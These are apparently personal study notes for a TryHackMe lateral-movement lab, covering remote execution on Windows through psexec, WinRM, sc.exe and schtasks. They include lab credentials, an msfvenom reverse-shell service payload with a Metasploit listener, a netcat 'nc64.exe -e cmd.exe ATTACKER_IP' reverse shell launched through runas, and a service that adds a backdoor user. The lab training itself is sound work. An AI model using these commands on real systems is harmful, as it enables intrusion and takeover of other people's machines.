<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Spawning Process Remotely</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Spawning Process Remotely</h1><br/><p><strong><h1>Spawning Process Remotely</h1></strong></p><p></p><p></p><p><strong><h3>A) Psexec</h3></strong></p><p></p><p>    <strong>Ports: 445/TCP (SMB)</strong></p><p>    <strong>Required Group Memberships: Administrators</strong></p><p></p><p>Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded here.</p><p>(<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>)</p><p></p><p>The way psexec works is as follows:</p><p></p><p>    ▪ Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.</p><p>    ▪ Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.</p><p>    ▪ Create some named pipes to handle stdin/stdout/stderr.</p><p>    </p><p></p><p><img src="images/337-1.png" alt="images/337-1.png" /></p><p></p><p><em><span style="text-decoration:underline;">Command to Open a CMD shell at a remote machine:</span></em></p><p></p><p><strong>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</strong></p><p></p><p></p><p></p><p><strong><h3>B) Remote Process Creation Using WinRM</h3></strong></p><p></p><p><strong>    Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</strong></p><p><strong>    Required Group Memberships: Remote Management Users</strong></p><p></p><p>Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.</p><p></p><p>To connect to a remote Powershell session from the command line, we can use the following command:</p><p></p><p><strong>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</strong></p><p></p><p>We can achieve the same from <strong>Powershell</strong>, but to pass different credentials, we will need to create a <strong>PSCredential object</strong>:</p><p></p><p>##########################</p><p><em>$username = &#39;Administrator&#39;;</em></p><p><em>$password = &#39;Mypass123&#39;;</em></p><p><em>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; </em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</em></p><p>##########################</p><p></p><p>Once we have our <strong>PSCredential object</strong>, we can create an interactive session using the <strong>Enter-PSSession</strong> <strong>cmdlet</strong>:</p><p></p><p>##########################</p><p><em>Enter-PSSession -Computername TARGET -Credential $credential</em></p><p>##########################</p><p></p><p>Powershell also includes the <strong>Invoke-Command cmdlet</strong>, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:</p><p></p><p>##########################</p><p><em>Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}</em></p><p>##########################</p><p></p><p></p><p><strong><h3>C) Remotely Creating Services Using “sc”</h3></strong></p><p></p><p><strong>    Ports:</strong></p><p><strong>        135/TCP, 49152-65535/TCP (DCE/RPC)</strong></p><p><strong>        445/TCP (RPC over SMB Named Pipes)</strong></p><p><strong>        139/TCP (RPC over SMB Named Pipes)</strong></p><p><strong>    Required Group Memberships: Administrators</strong></p><p></p><p>Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.</p><p></p><p>We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:</p><p></p><p>    1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.</p><p></p><p>	<img src="images/337-2.png" alt="images/337-2.png" /></p><p></p><p>	2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).</p><p>	</p><p>	<img src="images/337-3.png" alt="images/337-3.png" /></p><p></p><p>We can <strong>create</strong> and <strong>start</strong> a service named &quot;<strong>THMservice</strong>&quot; using the following commands:</p><p></p><p><strong>sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</strong></p><p><strong>sc.exe \\TARGET start THMservice</strong></p><p></p><p>The &quot;net user&quot; command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won&#39;t be able to look at the command output.</p><p></p><p>To stop and delete the service, we can then execute the following commands:</p><p></p><p><strong>sc.exe \\TARGET stop THMservice</strong></p><p><strong>sc.exe \\TARGET delete THMservice</strong></p><p></p><p></p><p><strong><h3>D) Creating Scheduled Tasks Remotely</h3></strong></p><p></p><p>Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:</p><p></p><p><strong>schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </strong></p><p></p><p><strong>schtasks /s TARGET /run /TN &quot;THMtask1&quot; </strong></p><p></p><p>We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won&#39;t matter much anyway.</p><p></p><p>Since the system will run the scheduled task, the command&#39;s output won&#39;t be available to us, making this a blind attack.</p><p></p><p>Finally, to <strong>delete</strong> the scheduled task, we can use the following command and clean up after ourselves:</p><p></p><p><strong>schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F</strong></p><p></p><p></p><p></p><p><strong><h2>Room Task</h2></strong></p><p></p><p><strong>ssh za\\&lt;AD Username&gt;@thmjmp2.za.tryhackme.com</strong></p><p></p><p>For this exercise, we will assume we have already captured some credentials with administrative access:</p><p></p><p><strong>User: ZA.TRYHACKME.COM\t1_leonard.summers</strong></p><p><strong>Password: EZpass4ever</strong></p><p></p><p>We&#39;ll show how to use those credentials to move laterally to THMIIS using sc.exe. Feel free to try the other methods, as they all should work against THMIIS.</p><p></p><p>While we have already shown how to use <strong>sc</strong> to <strong>create a user</strong> on a remote system (by using <strong>net user</strong>), we can also upload any binary we&#39;d like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to <strong>standard .exe files</strong>, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the <strong>exe-service</strong> format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.</p><p></p><p><strong><span style="text-decoration:underline;">Create a Service Binary in Our Attacker Machine:</span></strong><strong></strong></p><p><strong></strong></p><p><strong>msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_TUNNEL_IP LPORT=8888 -o cybex.exe</strong></p><p></p><p><strong>Note:</strong> As we are using staged payload. We need to configure msfconsole&#39;s listener to send the stage components post initial connection</p><p></p><p><strong><span style="text-decoration:underline;">Upload the file to Samba Share (windows directory -- $admin):</span></strong></p><p></p><p><strong>smbclient -c &#39;put cybex.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39;</strong></p><p></p><p>It will ask for Password</p><p></p><p><strong><span style="text-decoration:underline;">Next, Start a Listener for the above executible in msfconsole:</span></strong></p><p></p><p>msfconsole</p><p>msf6 &gt; use exploit/multi/handler</p><p>msf6 exploit(multi/handler) &gt; set LHOST ATTACKER_TUNNEL_IP</p><p>msf6 exploit(multi/handler) &gt; set LPORT 8888</p><p>msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp</p><p>msf6 exploit(multi/handler) &gt; exploit </p><p></p><p>Or</p><p></p><p><strong>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST ATTACKER_TUNNEL_IP; set LPORT 8888;exploit&quot;</strong></p><p></p><p><strong>Important</strong></p><p></p><p>Since <strong>sc.exe</strong> doesn&#39;t allow us to specify credentials as part of the command, we need to use <strong>runas</strong> to spawn a new shell with <strong>t1_leonard.summer</strong>&#39;s access token. </p><p></p><p>Still, we <strong>only</strong> have <strong>SSH access </strong>to the machine, so if we tried something like “<strong>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</strong>”, the new command prompt would <strong>spawn</strong> on the user&#39;s session, but we would have <strong>no access </strong>to it.</p><p></p><p><strong>Note:</strong> If we are using RDP into our initial account. We can still use the above as the new CMD prompt will be spawned on the Deskop. (We can access)</p><p></p><p><strong>Or</strong></p><p></p><p><strong>Solution when using SSH access (We have no access to new spawned CMD prompt)</strong></p><p> we can use runas to spawn a second reverse shell with t1_leonard.summers access token:</p><p> </p><p><strong> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 7777&quot;</strong></p><p> </p><p> We will keep a netcat listener on our Kali Machine: <strong>nc -lvnp 7777</strong> </p><p> Now, from the newly received shell we can run our <strong>sc</strong> commands.</p><p> </p><p><strong> Note:</strong> Remember that since you are using runas with the <strong>/netonly </strong>option, it will not bother to check if the provided credentials are valid, so be sure to type the password correctly. If you don&#39;t, you will see some ACCESS DENIED errors later in the room.</p><p> </p><p></p><p>And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:</p><p></p><p><strong>sc.exe \\thmiis.za.tryhackme.com create THMservice-5001 binPath= &quot;%windir%\cybex.exe&quot; start= auto</strong></p><p><strong>sc.exe \\thmiis.za.tryhackme.com start THMservice-5001</strong></p><p></p><p>Once the second command executes, we will get a reverse shell from the <strong>THMIIS</strong> machine in our msfconsoie.</p></div>
</body>
</html>
